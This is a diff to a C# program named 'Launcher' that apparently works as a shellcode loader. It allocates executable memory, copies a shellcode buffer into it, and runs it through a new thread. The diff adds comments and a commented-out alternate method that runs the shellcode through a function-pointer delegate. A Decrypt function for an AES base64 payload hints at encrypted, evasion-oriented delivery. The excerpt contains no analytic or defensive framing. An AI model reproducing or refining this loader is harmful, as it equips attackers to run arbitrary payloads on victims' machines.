@@ -55,10 +55,16 @@ namespace Launcher
             // 0x40 = PAGE_EXECUTE_READWRITE
             IntPtr buffer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
             Marshal.Copy(shellcode, 0, (IntPtr)(buffer), shellcode.Length);
+            
+            // method used for executing shellcode
             IntPtr thread = IntPtr.Zero;
             UInt32 threadId = 0;
             thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
             WaitForSingleObject(thread, 0xFFFFFFFF);
+            
+            // alternate method for executing the shellcode
+            // PrototypeFunc func = (PrototypeFunc)Marshal.GetDelegateForFunctionPointer(buffer, typeof(PrototypeFunc));
+            // func();
         }
 
         static byte[] Decrypt(string key, string aes_base64)
